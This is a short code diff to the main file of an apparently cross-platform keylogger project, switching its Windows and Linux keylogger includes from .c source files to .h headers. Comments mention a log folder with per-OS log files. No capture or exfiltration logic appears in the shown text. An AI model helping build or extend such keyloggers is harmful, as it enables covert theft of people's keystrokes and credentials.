@@ -1,8 +1,8 @@
 // Main file launching the keylogger depending on the OS
 
 #include <stdio.h>
-#include "Windows/win_keylog.c"
-#include "Linux/linux_keylog.c"
+#include "Windows/win_keylog.h"
+#include "Linux/linux_keylog.h"
 
 // folder log will contain the log files for each OS
 // the log files will be named according to the OS
